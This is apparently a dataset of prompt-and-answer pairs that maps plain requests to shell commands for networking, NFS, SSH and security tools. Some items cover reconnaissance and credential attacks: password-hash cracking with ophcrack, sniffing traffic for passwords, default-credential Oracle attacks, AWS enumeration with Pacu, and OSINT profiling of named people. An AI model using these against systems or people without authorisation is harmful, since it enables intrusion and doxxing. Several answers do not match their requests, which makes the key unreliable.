{"input": "Capture packets on the `eth0` interface and forward them to the `eth1` interface while randomizing the packet order", "answer": "netsniff-ng --in eth0 --out eth1 --rand"}
{"input": "Capture packets on the `eth0` interface and save them to a file named `capture.pcap` while dropping privileges to the user `bob` and group `users`", "answer": "sudo -u bob -g users netsniff-ng --in eth0 --out capture.pcap"}
{"input": "Send 10,000 packets with a random selection of packets from the configuration file trafgen.cfg to the network interface eth0", "answer": "trafgen --dev eth0 --conf trafgen.cfg --num 10000 --rand"}
{"input": "Generate network traffic on interface eth0 using the configuration file trafgen.cfg, and set the interpacket gap to 500 microseconds", "answer": "trafgen --dev eth0 --conf trafgen.cfg --gap 500us"}
{"input": "Send traffic at a rate of 1 million packets per second (1 Mpps) to the network interface eth0 using the configuration file trafgen.cfg", "answer": "trafgen --dev eth0 --conf trafgen.cfg --rate 1Mpps"}
{"input": "Generate network traffic on interface eth0 using the configuration file trafgen.cfg, and enable verbose output for detailed logging", "answer": "trafgen --dev eth0 --conf trafgen.cfg --verbose"}
{"input": "Send 50,000 packets to the network interface eth0 using the configuration file trafgen.cfg, and randomize the packet selection while using CPUs 2 to 4 for processing", "answer": "trafgen --dev eth0 --conf trafgen.cfg --num 50000 --rand --cpus 2-4"}
{"input": "Generate network traffic on interface eth0 using the configuration file trafgen.cfg, and set the ring buffer size to 2 MiB", "answer": "trafgen --dev eth0 --conf trafgen.cfg --ring-size 2MiB"}
{"input": "Send traffic to the network interface eth0 using the configuration file trafgen.cfg, and drop privileges to the user \"bob\" and group \"users\"", "answer": "trafgen --dev eth0 --conf trafgen.cfg --user bob --group users"}
{"input": "Generate network traffic on interface eth0 using the configuration file trafgen.cfg, and manually set the random seed to 12345 for reproducible packet generation", "answer": "trafgen --dev eth0 --conf trafgen.cfg --seed 12345"}
{"input": "Generate network traffic on interface eth0 using the configuration file trafgen.cfg, and run the configuration through the C preprocessor before execution", "answer": "trafgen --dev eth0 --conf trafgen.cfg --cpp"}
{"input": "Generate network traffic on interface eth0 using the configuration file trafgen.cfg, and do not touch the IRQ CPU affinity of the NIC", "answer": "trafgen --dev eth0 --conf trafgen.cfg --notouch-irq"}
{"input": "Use netwox to send a TCP SYN packet from IP 192.168.1.10 to IP 192.168.1.20 with source port 5000 and destination port 80.\"", "answer": "netwox 40 --ip4-src 192.168.1.10 --ip4-dst 192.168.1.20 --tcp-src 5000 --tcp-dst 80 --tcp-flags syn"}
{"input": "Use netwox to sniff and display all HTTP traffic on port 80.\"", "answer": "netwox 24 --filter \"tcp port 80\""}
{"input": "Use netwox to send a UDP packet from IP 10.0.0.1 to IP 10.0.0.2 with source port 1234 and destination port 5678.\"", "answer": "netwox 6 --ip4-src 10.0.0.1 --ip4-dst 10.0.0.2 --udp-src 1234 --udp-dst 5678"}
{"input": "Use netwox to perform a DNS query for the domain example.com.\"", "answer": "netwox 105 --dns-name example.com"}
{"input": "Scan the network 172.16.10.0/24 for pivot points and filter the output to show only open ports", "answer": "nmap -p- --open 172.16.10.0/24"}
{"input": "I need to troubleshoot an issue with the PNFS block layout mapping daemon. How can I enable detailed logging and keep it running in the foreground?", "answer": "blkmapd -d -f"}
{"input": "How do I start the PNFS block layout mapping daemon in a way that allows me to see its output directly in the terminal while also enabling detailed logging?", "answer": "blkmapd -d -f"}
{"input": "Perform a fake mount of the NFS share at 172.16.0.10:/backup to /mnt/backup without actually mounting it, and do not update /etc/mtab", "answer": "mount.nfs 172.16.0.10:/backup /mnt/backup -fn"}
{"input": "Mount the NFSv4 share located at 192.168.1.100:/data to the local directory /mnt/nfs_share in read-only mode, and ensure the mount is verbose for debugging purposes", "answer": "mount.nfs4 192.168.1.100:/data /mnt/nfs_share -o ro -v"}
{"input": "Mount the NFSv4 share from 10.0.0.50:/exports to /media/nfs_mount with read-write access, but do not update the /etc/mtab file", "answer": "mount.nfs4 10.0.0.50:/exports /media/nfs_mount -o rw -n"}
{"input": "Perform a fake mount of the NFSv4 share at 172.16.32.45:/backup to /mnt/test_mount to test the configuration without actually mounting it", "answer": "mount.nfs4 172.16.32.45:/backup /mnt/test_mount -f"}
{"input": "Mount the NFSv4 share from 192.168.10.20:/home to /mnt/nfs_home with read-write access, tolerating sloppy mount options to avoid failure", "answer": "mount.nfs4 192.168.10.20:/home /mnt/nfs_home -o rw -s"}
{"input": "Mount the NFSv4 share at 10.10.10.10:/storage to /mnt/nfs_storage in read-only mode and print the version of the mount.nfs4 tool being used", "answer": "mount.nfs4 10.10.10.10:/storage /mnt/nfs_storage -o ro -V"}
{"input": "Mount the NFSv4 share from 192.168.2.200:/projects to /mnt/nfs_projects with read-write access, and ensure the process is verbose for detailed logging", "answer": "mount.nfs4 192.168.2.200:/projects /mnt/nfs_projects -o rw -v"}
{"input": "Mount the NFSv4 share at 10.1.1.1:/archive to /mnt/nfs_archive in read-only mode, and do not update the /etc/mtab file", "answer": "mount.nfs4 10.1.1.1:/archive /mnt/nfs_archive -o ro -n"}
{"input": "Mount the NFSv4 share from 192.168.5.55:/media to /mnt/nfs_media with read-write access, tolerating sloppy mount options, and print the version of the tool", "answer": "mount.nfs4 192.168.5.55:/media /mnt/nfs_media -o rw -s -V"}
{"input": "Perform a fake mount of the NFSv4 share at 172.20.30.40:/data to /mnt/nfs_test with verbose output to debug the configuration", "answer": "mount.nfs4 172.20.30.40:/data /mnt/nfs_test -f -v"}
{"input": "Mount the NFSv4 share from 10.2.2.2:/shared to /mnt/nfs_shared in read-only mode, tolerating sloppy mount options, and do not update the /etc/mtab file", "answer": "mount.nfs4 10.2.2.2:/shared /mnt/nfs_shared -o ro -s -n"}
{"input": "Display all NFS client per-mount statistics for the mount point `/mnt/nfs`", "answer": "mountstats /mnt/nfs"}
{"input": "Retrieve all available statistics for the NFS mount point `/mnt/media` using the default sub-command", "answer": "mountstats /mnt/media"}
{"input": "Modify the NFS configuration file to include a custom header with the text \"Custom NFS Config\"", "answer": "echo '# Custom NFS Config' | sudo tee -a /etc/exports"}
{"input": "Show NFS statistics for all facilities in a list format", "answer": "nfsstat -o all -l"}
{"input": "Display NFS version 4 statistics along with general RPC information", "answer": "nfsstat -4 -o rpc"}
{"input": "Show NFS server statistics along with file handle cache and read-ahead cache details", "answer": "nfsstat -s -o fh,ra"}
{"input": "Run rpc.gssd with a preferred realm of `EXAMPLE.COM`, a timeout of 30 seconds, and enable debugging output", "answer": "rpc.gssd -R EXAMPLE.COM -t 30 -D"}
{"input": "Start rpc.gssd with no-fork mode, using the pipe filesystem directory `/var/lib/nfs/rpc_pipefs`, and set the upcall timeout to 10 seconds", "answer": "rpc.gssd -M -p /var/lib/nfs/rpc_pipefs -U 10"}
{"input": "Run rpc.gssd with no keytab, a preferred realm of `EXAMPLE.ORG`, and an upcall timeout of 5 seconds", "answer": "rpc.gssd -n -R EXAMPLE.ORG -U 5"}
{"input": "Start the rpc.idmapd service in the foreground with verbose logging enabled", "answer": "rpc.idmapd -fv"}
{"input": "Run rpc.idmapd in the foreground, enabling verbose logging and specifying a custom configuration file located at `/etc/custom_idmapd.conf`", "answer": "rpc.idmapd -fv -c /etc/custom_idmapd.conf"}
{"input": "Start rpc.idmapd in the foreground, enabling verbose logging, and specify a custom pipe directory located at `/var/lib/nfs/rpc_pipefs`", "answer": "rpc.idmapd -fv -p /var/lib/nfs/rpc_pipefs"}
{"input": "Run rpc.idmapd in the foreground, enabling verbose logging, and disable the use of the cache for ID mapping", "answer": "rpc.idmapd -fv -C"}
{"input": "Start rpc.idmapd in the foreground, enabling verbose logging, and specify both a custom configuration file at `/etc/custom_idmapd.conf` and a custom pipe directory at `/var/lib/nfs/rpc_pipefs`", "answer": "rpc.idmapd -fv -c /etc/custom_idmapd.conf -p /var/lib/nfs/rpc_pipefs"}
{"input": "Start rpc.idmapd in the foreground, enabling verbose logging, and specify a custom pipe directory at `/var/lib/nfs/rpc_pipefs` while disabling the cache for ID mapping", "answer": "rpc.idmapd -fv -p /var/lib/nfs/rpc_pipefs -C"}
{"input": "Start rpc.idmapd in the foreground, enabling verbose logging, and specify a custom configuration file at `/etc/custom_idmapd.conf` while also specifying a custom pipe directory at `/var/lib/nfs/rpc_pipefs`", "answer": "rpc.idmapd -fv -c /etc/custom_idmapd.conf -p /var/lib/nfs/rpc_pipefs"}
{"input": "Start the rpc.statd service in the foreground with verbose logging to stderr", "answer": "rpc.statd -F -d"}
{"input": "Run rpc.statd with verbose logging to stderr and specify the local hostname as \"backup-server\"", "answer": "rpc.statd -d -n backup-server"}
{"input": "Run the rpc.svcgssd daemon with verbose logging, reverse DNS lookups, and ignore cached credentials", "answer": "rpc.svcgssd -v -r -i"}
{"input": "Enable all debug flags for the NFS module and redirect the output to a log file for later analysis", "answer": "rpcdebug -m nfs -s all > nfs_debug.log"}
{"input": "Display all mount information for the NFS server at IP address 192.168.1.100, including both client and directory details", "answer": "showmount --all 192.168.1.100"}
{"input": "Show all mount information for the local NFS server, including client and directory details", "answer": "showmount --all"}
{"input": "List all mounts, including client and directory information, for the NFS server at 192.168.0.10, and include help text for reference", "answer": "showmount 192.168.0.10 --all"}
{"input": "Show all mount details for the NFS server at 10.0.0.1, and include the version information of the showmount tool", "answer": "showmount --all 10.0.0.1 && showmount --version"}
{"input": "Start the statd service with all default settings and options", "answer": "sudo systemctl start statd"}
{"input": "Unmount the NFS directory `/mnt/data` lazily and provide verbose output during the process", "answer": "umount.nfs /mnt/data -l -v"}
{"input": "Unmount the NFS directory `/mnt/temp` forcefully and lazily without updating `/etc/mtab`", "answer": "umount.nfs /mnt/temp -f -l -n"}
{"input": "Forcefully unmount the NFS directory `/mnt/archive` and provide verbose output while preventing updates to `/etc/mtab`", "answer": "umount.nfs /mnt/archive -f -v -n"}
{"input": "Unmount the NFS directory `/mnt/media` lazily and prevent updating `/etc/mtab`", "answer": "umount.nfs /mnt/media -l -n"}
{"input": "Unmount the NFS directory `/mnt/storage` forcefully and lazily while providing verbose output", "answer": "umount.nfs /mnt/storage -f -l -v"}
{"input": "Unmount the NFS4 directory `/mnt/nfs_share` forcefully and lazily, ensuring verbose output and not updating `/etc/mtab`", "answer": "umount.nfs4 /mnt/nfs_share -fvl -n"}
{"input": "Unmount the NFS4 directory `/mnt/nfs_backup` lazily without updating `/etc/mtab`", "answer": "umount.nfs4 /mnt/nfs_backup -l -n"}
{"input": "Export all directories listed in `/etc/exports` to all allowed clients", "answer": "exportfs -a"}
{"input": "Unexport all directories currently shared via NFS", "answer": "exportfs -ua"}
{"input": "Unexport the directory `/home/user` from the client `192.168.1.50`", "answer": "exportfs -u 192.168.1.50:/home/user"}
{"input": "Run the NFSv4 Client Tracking Daemon in the foreground, using the default pipefs and storage directories", "answer": "nfsdcld -F"}
{"input": "Start the NFSv4 Client Tracking Daemon with a custom storage directory `/mnt/nfs/storage` and pipefs directory `/mnt/nfs/pipefs`", "answer": "nfsdcld -p /mnt/nfs/pipefs -s /mnt/nfs/storage"}
{"input": "Run the NFSv4 Client Tracking Daemon in debug mode and foreground, using the default directories", "answer": "nfsdcld -d -F"}
{"input": "Start the NFSv4 Client Tracking Daemon with a custom pipefs directory `/opt/nfs/pipefs` and default storage directory", "answer": "nfsdcld -p /opt/nfs/pipefs"}
{"input": "Start the NFSv4 Client Tracking Daemon in debug mode, using a custom pipefs directory `/var/nfs/pipefs` and a custom storage directory `/var/nfs/storage`", "answer": "nfsdcld -d -p /var/nfs/pipefs -s /var/nfs/storage"}
{"input": "Add a new NFS junction for the directory `/mnt/logs` on the server `192.168.1.90` with the type `nfs4`", "answer": "sudo mount -t nfs4 192.168.1.90:/mnt/logs /mnt/logs"}
{"input": "Run the NFS mount daemon with reverse DNS lookups enabled, manage GIDs, and use a custom state directory path `/var/lib/nfs`", "answer": "rpc.mountd -r -g -s /var/lib/nfs"}
{"input": "Monitor network traffic on interface `wlan0` for packets containing the word \"password\" as a whole word, and display the output in hexadecimal format", "answer": "ngrep -w -x -d wlan0 \"password\""}
{"input": "Monitor traffic on interface `eth0` for packets containing the hexadecimal value `0x1a2b3c`, and display the output without printing packet reception hash marks", "answer": "ngrep -x -q -d eth0 \"1a2b3c\""}
{"input": "Monitor traffic on interface `eth0` for packets matching the string \"admin\", and limit the output to 100 packets", "answer": "ngrep -n 100 -d eth0 \"admin\""}
{"input": "Capture traffic on interface `eth0` and display the output in a byline format, ensuring line buffering for real-time updates", "answer": "ngrep -W byline -l -d eth0"}
{"input": "Monitor traffic on interface `eth0` for packets containing the string \"admin\", and specify a non-printable display character as `*`", "answer": "ngrep -P '*' -d eth0 \"admin\""}
{"input": "Monitor traffic on interface `eth0` for packets containing the string \"POST\", and set the BPF capture length to 128 bytes", "answer": "ngrep -s 128 -d eth0 \"POST\""}
{"input": "Scan the web server at 192.168.1.100 for all known vulnerabilities using Nikto, and save the output in a CSV file named \"scan_results.csv\"", "answer": "nikto -h 192.168.1.100 -output scan_results.csv -Format csv"}
{"input": "Check the web server at 192.168.1.50 for vulnerabilities, using a specific configuration file named \"custom_config.conf\", and save the output in an HTML file", "answer": "nikto -h 192.168.1.50 -config custom_config.conf -output scan_results.html -Format htm"}
{"input": "Generate a comprehensive security report for a Cisco IOS router configuration file named `router.conf` and save the output as `report.html`", "answer": "nipper --ios-router --input=router.conf --output=report.html"}
{"input": "Generate a security report for a Juniper Netscreen firewall configuration file `netscreen.conf` and save the output as `netscreen_report.pdf`", "answer": "nipper --netscreen --input=netscreen.conf --output=netscreen_report.pdf"}
{"input": "Generate a security report for a Cisco PIX firewall configuration file `pix.conf` and save the output as `pix_report.tex`", "answer": "nipper --pix --input=pix.conf --output=pix_report.tex"}
{"input": "Analyze a Cisco IOS switch configuration file `switch.conf` and output the report to `switch_report.html`", "answer": "nipper --ios-switch --input=switch.conf --output=switch_report.html"}
{"input": "Generate a security report for a Fortinet FortiGate firewall configuration file `fortigate.conf` and save the output as `fortigate_report.html`", "answer": "nipper --fortigate --input=fortigate.conf --output=fortigate_report.html"}
{"input": "Listen for incoming TCP connections on port 8080 and allow multiple connections to stay open", "answer": "ncat -l -p 8080 -k"}
{"input": "Listen for incoming connections on port 1234 and save all received data to a file named `output.log`", "answer": "ncat -l -p 1234 -o output.log"}
{"input": "Perform a zero-I/O scan to check if port 22 is open on the host 10.0.0.1", "answer": "ncat -z 10.0.0.1 22"}
{"input": "Connect to a remote server at 192.168.1.50 on port 3306 and dump the session data in hexadecimal format to a file named `hexdump.log`", "answer": "ncat 192.168.1.50 3306 --hex-dump hexdump.log"}
{"input": "Generate a text-based comparison report for two Nmap scans saved in `initial_scan.xml` and `rescan.xml`", "answer": "ndiff --text initial_scan.xml rescan.xml"}
{"input": "Compare two Nmap scans stored in `baseline.xml` and `updated.xml`, showing only the differences without verbose output", "answer": "ndiff baseline.xml updated.xml"}
{"input": "Compare two Nmap scans saved in `first_scan.xml` and `second_scan.xml`, showing all differences in a text-based report", "answer": "ndiff -v --text first_scan.xml second_scan.xml"}
{"input": "Compare two Nmap scans stored in `pre_patch.xml` and `post_patch.xml`, showing all differences including unchanged hosts and ports in a text-based report", "answer": "ndiff -v --text pre_patch.xml post_patch.xml"}
{"input": "Compare two Nmap scan results in `network_scan1.xml` and `network_scan2.xml`, showing only the differences in a text-based report", "answer": "ndiff --text network_scan1.xml network_scan2.xml"}
{"input": "Perform a comprehensive scan on the target IP 192.168.1.1, including OS detection, version detection, script scanning, and traceroute", "answer": "nmap -A 192.168.1.1"}
{"input": "Perform a scan on the target IP 192.168.2.1 with aggressive timing, enabling OS detection and version detection, and save the results in all major formats with a base filename of aggressive_scan", "answer": "nmap -T4 -A -oA aggressive_scan 192.168.2.1"}
{"input": "Send a UDP probe to the IP address 192.168.0.100 with a source port of 54321, destination port of 53, and include a custom payload of \"testdata\"", "answer": "nping --udp -p 53 -g 54321 --data-string \"testdata\" 192.168.0.100"}
{"input": "Perform an ARP probe to the IP address 192.168.1.50 with a custom sender MAC address of 00:11:22:33:44:55 and a target MAC address of 66:77:88:99:AA:BB", "answer": "nping --arp --arp-sender-mac 00:11:22:33:44:55 --arp-target-mac 66:77:88:99:AA:BB 192.168.1.50"}
{"input": "Send an ICMP probe to the IP address 172.16.0.1 with a custom ICMP type of 8 (Echo Request) and a code of 0, using a TTL of 64", "answer": "nping --icmp --icmp-type 8 --icmp-code 0 --ttl 64 172.16.0.1"}
{"input": "Perform a TCP probe to the IP address 192.168.2.200 with all TCP flags set, a custom sequence number of 1000, and an acknowledgment number of 2000", "answer": "nping --tcp --flags all --seq 1000 --ack 2000 192.168.2.200"}
{"input": "Send a UDP probe to the IP address 10.0.0.5 with a source port of 12345, destination port of 161, and a payload length of 100 bytes", "answer": "nping --udp -p 161 -g 12345 --data-length 100 10.0.0.5"}
{"input": "Run Nuclei on `example.com` with a custom header `Authorization: Bearer token123` and follow redirects", "answer": "nuclei -target example.com -H \"Authorization: Bearer token123\" -fr"}
{"input": "Validate the templates located in the directory `/path/to/templates` without running a scan", "answer": "nuclei -validate -t /path/to/templates"}
{"input": "Run Nuclei on `example.com` with a custom configuration file `config.yaml` and disable color output", "answer": "nuclei -target example.com -config config.yaml -nc"}
{"input": "Check the SSL connection to example.tld for compliance with BSI TR-02102-2 using o-saft", "answer": "o-saft.pl +bsi example.tld"}
{"input": "Run all odat modules against the Oracle database at 172.16.1.20 with the username \"scott\" and password \"tiger\"", "answer": "odat all -s 172.16.1.20 -U scott -P tiger"}
{"input": "Scan the subnet 192.168.1.0/24 using the default community strings \"public\" and \"private\" to identify SNMP-enabled devices", "answer": "onesixtyone 192.168.1.0/24 public private"}
{"input": "Use a custom list of community strings from a file named `communities.txt` to scan the subnet 10.0.0.0/24 for SNMP-enabled devices", "answer": "onesixtyone -c communities.txt 10.0.0.0/24"}
{"input": "Scan a list of target hosts from a file named `targets.txt` using the default community strings and save the output to a log file named `scan_results.log`", "answer": "onesixtyone -i targets.txt -o scan_results.log public private"}
{"input": "Scan the subnet 192.168.2.0/24 using a custom community string \"secret\" and specify an alternate SNMP port 1610", "answer": "onesixtyone -p 1610 192.168.2.0/24 secret"}
{"input": "Scan the subnet 10.1.1.0/24 using a custom list of community strings from `custom_communities.txt`, save the output to `output.log`, and enable quiet mode to suppress stdout logging", "answer": "onesixtyone -c custom_communities.txt -o output.log -q 10.1.1.0/24"}
{"input": "Start OpenOCD, set the debug level to 1, and redirect log output to \"output.log\"", "answer": "openocd -d1 -l output.log"}
{"input": "Copy all files from the remote server `172.16.254.1` located in `/shared/files/` to the local directory `/home/user/downloads/` using a custom SSH configuration file `custom_ssh_config`", "answer": "scp -F ~/.ssh/custom_ssh_config -r user@172.16.254.1:/shared/files/* /home/user/downloads/"}
{"input": "Copy all files from the remote server `192.0.2.3` located in `/opt/data/` to the local directory `/home/user/data/` while limiting the bandwidth to 100 KB/s", "answer": "scp -l 800 -r user@192.0.2.3:/opt/data/ /home/user/data/"}
{"input": "Connect to an SFTP server at 10.0.0.10 with verbose output to debug connection issues", "answer": "sftp -v user@10.0.0.10"}
{"input": "Connect to the remote server at 10.0.0.5 on port 2222 using the private key file `id_rsa` for authentication", "answer": "ssh -p 2222 -i ~/.ssh/id_rsa 10.0.0.5"}
{"input": "Start an SSH agent in C shell format with a key lifetime of 3600 seconds", "answer": "ssh-agent -c -t 3600"}
{"input": "Start an SSH agent with the SHA256 fingerprint hash algorithm and bind it to the default address", "answer": "ssh-agent -E sha256"}
{"input": "Retrieve SSH public keys from multiple servers listed in a file named `servers.txt`, using port 2222, and output the results in a file called `keys.txt`", "answer": "ssh-keyscan -p 2222 -f servers.txt > keys.txt"}
{"input": "Scan SSH public keys from a range of servers with IPs 10.0.0.1 to 10.0.0.5, using a timeout of 5 seconds, and output the results to the terminal", "answer": "ssh-keyscan -T 5 10.0.0.1 10.0.0.2 10.0.0.3 10.0.0.4 10.0.0.5"}
{"input": "Copy a file named \"logfile.log\" from a remote server with IP 192.168.3.20 to the local machine, using a custom SSH configuration file located at \"/etc/ssh/custom_config\"", "answer": "scp -F /etc/ssh/custom_config user@192.168.3.20:logfile.log ./"}
{"input": "Create a new TAXII2 API root with the title \"RansomwareIndicators\" and a description \"Feed containing ransomware-related indicators\" but do not set it as the default", "answer": "opentaxii-add-api-root -t \"RansomwareIndicators\" -d \"Feed containing ransomware-related indicators\" --no-default"}
{"input": "Create a TAXII2 collection named \"MalwareIndicators\" with the description \"Collection of malware indicators\" under the API root ID \"root-456\", and allow public write access", "answer": "opentaxii-add-collection -r root-456 -t MalwareIndicators -d \"Collection of malware indicators\" --public-write"}
{"input": "Add a TAXII2 collection with the title \"PhishingData\", alias \"phish-collection\", and description \"Phishing campaign data\" under the API root ID \"root-789\"", "answer": "opentaxii-add-collection -r root-789 -t PhishingData -a phish-collection -d \"Phishing campaign data\""}
{"input": "Create a TAXII2 collection named \"APTReports\" under the API root ID \"root-101\", make it publicly readable, and allow public write access", "answer": "opentaxii-add-collection -r root-101 -t APTReports --public --public-write"}
{"input": "Add a TAXII2 collection with the title \"BotnetData\", description \"Data related to botnet activity\", and alias \"botnet-collection\" under the API root ID \"root-404\", and make it publicly readable", "answer": "opentaxii-add-collection -r root-404 -t BotnetData -d \"Data related to botnet activity\" -a botnet-collection --public"}
{"input": "Create a TAXII2 collection named \"ExploitKits\" under the API root ID \"root-505\" with the description \"Collection of exploit kit indicators\" and allow public write access", "answer": "opentaxii-add-collection -r root-505 -t ExploitKits -d \"Collection of exploit kit indicators\" --public-write"}
{"input": "Delete all jobs from the OpenTAXII system to troubleshoot potential issues", "answer": "opentaxii-job-cleanup --all"}
{"input": "Start the OpenTAXII development server with all default configurations and enable debug mode", "answer": "opentaxii-run-dev --debug"}
{"input": "Launch the OpenTAXII development server with all default options and enable verbose logging for debugging purposes", "answer": "opentaxii-run-dev --verbose"}
{"input": "Run the OpenTAXII development server with all default settings and disable automatic reloading of the application", "answer": "opentaxii-run-dev --no-reload"}
{"input": "Run the OpenTAXII development server with all default configurations and specify a custom SSL certificate and key for secure communication", "answer": "opentaxii-run-dev --ssl-cert /path/to/cert.pem --ssl-key /path/to/key.pem"}
{"input": "Start the OpenTAXII development server with all default options and specify a custom log file for storing server logs", "answer": "opentaxii-run-dev --log-file /path/to/logfile.log"}
{"input": "Run the OpenTAXII development server with all default configurations and enable profiling to analyze performance", "answer": "opentaxii-run-dev --profile"}
{"input": "Configure OpenVPN to use a custom script `up.sh` to run after the TUN device is opened", "answer": "openvpn --up up.sh"}
{"input": "Crack Windows passwords using rainbow tables located in `/opt/tables` and load hashes from the file `hashes.txt`", "answer": "ophcrack-cli -d /opt/tables -f hashes.txt"}
{"input": "Crack Windows passwords using rainbow tables in `/tables`, disable empty password display, and use quiet mode", "answer": "ophcrack-cli -d /tables -e -q"}
{"input": "Scan the Oracle database server at IP 192.168.1.100 on port 1521 and save the report to `oracle_report.txt`", "answer": "oscanner -s 192.168.1.100 -P 1521 -r oracle_report.txt"}
{"input": "Scan multiple Oracle database servers listed in the file `server_list.txt` and save the report to `combined_scan_results.txt`", "answer": "oscanner -f server_list.txt -r combined_scan_results.txt"}
{"input": "Create aliases for a person named \"Maria Garcia Lopez,\" with the first surname \"Garcia,\" the second surname \"Lopez,\" born in 1985, and include common words at the end of the nicknames", "answer": "alias_generator.py -n Maria -s1 Garcia -s2 Lopez -y 1985 --common-words"}
{"input": "Generate aliases for a person named \"Ahmed Khan\" with the first surname \"Khan,\" born in 1975, living in \"Dubai,\" and apply leet speak transformations to the nicknames", "answer": "alias_generator.py -n Ahmed -s1 Khan -y 1975 -c Dubai --leet"}
{"input": "Create aliases for a person named \"Carlos Ruiz\" with the first surname \"Ruiz,\" born in 1980, and include the extra words \"tech\" and \"gamer\" in the nicknames", "answer": "alias_generator.py -n Carlos -s1 Ruiz -y 1980 --extra-words tech gamer"}
{"input": "Generate aliases for a person named \"Anna Kowalski\" with the first surname \"Kowalski,\" born in 1988, and include leet speak transformations along with country-specific endings", "answer": "alias_generator.py -n Anna -s1 Kowalski -y 1988 --leet --locales"}
{"input": "Generate aliases for a person named \"Mohammed Ali\" with the first surname \"Ali,\" born in 1970, and include the extra words \"boxer\" and \"champ\" in the nicknames", "answer": "alias_generator.py -n Mohammed -s1 Ali -y 1970 --extra-words boxer champ"}
{"input": "Show the version of the checkfy.py tool", "answer": "checkfy.py --version"}
{"input": "Use a file containing a list of nicks to check domain availability, exclude the domains \".example.com\" and \".test.com\", and run the process with 8 threads", "answer": "domainfy.py -N nicks_list.txt -x .example.com .test.com -T 8"}
{"input": "Check the existence of the nickname \"dave\" across the domains \"example.com\" and \"test.com\" and exclude the domain \"exclude.com\" using mailfy", "answer": "mailfy -n dave -d example.com test.com -x exclude.com"}
{"input": "Check if the nicknames \"john_doe\" and \"jane_doe\" exist in the domains \"example.com\" and \"test.com\", excluding the domain \"excluded.com\"", "answer": "mailfy.py -n john_doe jane_doe -d example.com test.com -x excluded.com"}
{"input": "Look for registered accounts with the nickname \"johndoe123\" across multiple platforms using the usufy subcommand in OSRFramework", "answer": "osrf usufy \"johndoe123\""}
{"input": "Perform a search for the term \"cybersecurity\" across multiple platforms using the searchfy subcommand in OSRFramework", "answer": "osrf searchfy \"cybersecurity\""}
{"input": "Retrieve information about the email account \"john.doe@example.com\" using the mailfy subcommand in OSRFramework", "answer": "osrf mailfy \"john.doe@example.com\""}
{"input": "Check the phone numbers 1111111111 and 2222222222 across all platforms, but exclude both `listaspam` and `xtelefonos` from the search", "answer": "phonefy -n 1111111111 2222222222 -p all -x listaspam xtelefonos"}
{"input": "Check the phone numbers +9988776655 and +5544332211 in all platforms, exclude `infotelefonica`, and generate the output files with a `.csv` extension", "answer": "phonefy.py -n +9988776655 +5544332211 -p all -x infotelefonica -e csv"}
{"input": "Check the phone numbers +6667778888 and +2223334444 in all platforms, exclude `xtelefonos`, and suppress all output messages", "answer": "phonefy.py -n +6667778888 +2223334444 -p all -x xtelefonos --quiet"}
{"input": "Search for the username \"john_doe\" across all available platforms using searchfy.py", "answer": "searchfy.py -q john_doe -p all"}
{"input": "Search for the username \"test_user\" on all platforms except GitHub, and open the results in a web browser", "answer": "searchfy.py -q test_user -p all -x github -w"}
{"input": "Verify if the usernames \"alice\" and \"bob\" exist on all platforms tagged as \"social_media\" using usufy.py", "answer": "usufy.py -n alice bob -t social_media"}
{"input": "Search for the username \"sample_user\" on all platforms and open the results in the default web browser", "answer": "usufy.py -n sample_user -p all -w"}
{"input": "Extract a hidden message from the file `secret.jpg` using the key `mysecretkey` and save the output to `extracted_message.txt`", "answer": "outguess -r secret.jpg extracted_message.txt -k mysecretkey"}
{"input": "Extract a hidden message from `image.jpg` using 5 key derivations and save the output to `output.txt`", "answer": "outguess -k 5 -r image.jpg output.txt"}
{"input": "Perform a complete scan on the domain example.com and save the output to a file named scan_results.txt", "answer": "nmap -A -oN scan_results.txt example.com"}
{"input": "Conduct a thorough scan on the network range 192.168.1.0/24, including all available modules, and display verbose output", "answer": "nmap -A -v 192.168.1.0/24"}
{"input": "Perform a full scan on the domain sub.example.com, using all modules, and exclude port 22 from the scan", "answer": "nmap -p- --exclude-ports 22 sub.example.com"}
{"input": "Perform a full scan on the IP address 192.168.0.10, using all modules, and log the results to a file named full_scan.log", "answer": "nmap -A 192.168.0.10 -oN full_scan.log"}
{"input": "Analyze network traffic on the `eth1` interface in promiscuous mode and limit the number of parallel API connections to 10", "answer": "tcpdump -i eth1 -p"}
{"input": "Analyze network traffic on the `eth2` interface, set the connection cache age limit to 60 seconds, and cap the number of active hosts to 5000", "answer": "p0f -i eth2 -t 60 -m 5000"}
{"input": "Create a Java runtime package named \"MyRuntime\" using a predefined runtime image located in the \"runtimeImageDir\" directory", "answer": "jpackage -n MyRuntime --runtime-image runtimeImageDir"}
{"input": "Compress the JAR file `example.jar` into a pack200 file `example.pack.gz` while preserving the file order and removing debugging attributes", "answer": "pack200 --keep-file-order -G example.pack.gz example.jar"}
{"input": "Repack the JAR file `input.jar` into `output.jar` without compressing it with gzip and with the highest packing effort", "answer": "pack200 -r -E9 input.jar output.jar"}
{"input": "Compress the JAR file `library.jar` into `library.pack.gz` while setting the verbosity to the lowest level and using a custom class attribute `SourceFile=RUH`", "answer": "pack200 -q -C SourceFile=RUH library.pack.gz library.jar"}
{"input": "Repack the JAR file `original.jar` into `updated.jar` while removing debugging attributes and using a segment limit of 50000", "answer": "pack200 -r -G -S50000 updated.jar original.jar"}
{"input": "Generate password statistics from \"passwords.txt\" and save the output to \"output.masks,\" while hiding rare statistics and suppressing headers", "answer": "statsgen --hiderare -q -o output.masks passwords.txt"}
{"input": "Unpack the file `data.pack` into `output.jar` and override the deflate hint to `false`", "answer": "unpack200 -Hfalse data.pack output.jar"}
{"input": "Unpack the file `archive.pack.gz` into `archive.jar` and log the output to a file named `unpack.log`", "answer": "gunzip -c archive.pack.gz | unpack200 - archive.jar > unpack.log 2>&1"}
{"input": "Unpack the file `library.pack` into `library.jar` and print the program version before starting", "answer": "unpack200 -V library.pack library.jar"}
{"input": "Compress the JAR file `module.jar` into `module.pack.gz` while transmitting the modification time as `keep` and logging the output to the console", "answer": "pack200 -m keep -l - module.pack.gz module.jar"}
{"input": "Execute the \"iam__enum_users\" module in Pacu", "answer": "pacu\nrun iam__enum_users"}
{"input": "Set the regions to \"us-east-1\" and \"us-west-2\" for the current session in Pacu", "answer": "pacu\nset_regions us-east-1 us-west-2"}
{"input": "Execute the \"s3__enum_buckets\" module with the argument to scan all regions in Pacu", "answer": "pacu --module-name s3__enum_buckets --module-args='--regions all' --exec"}
{"input": "Use parsero to analyze the website \"test-site.com\" and search for disallowed directories indexed by Bing", "answer": "parsero -u test-site.com -sb"}
{"input": "List all partitions on all block devices in a machine-readable format", "answer": "parted -l -m"}
{"input": "Display the partition table of `/dev/sda` along with free space information", "answer": "parted /dev/sda print free"}
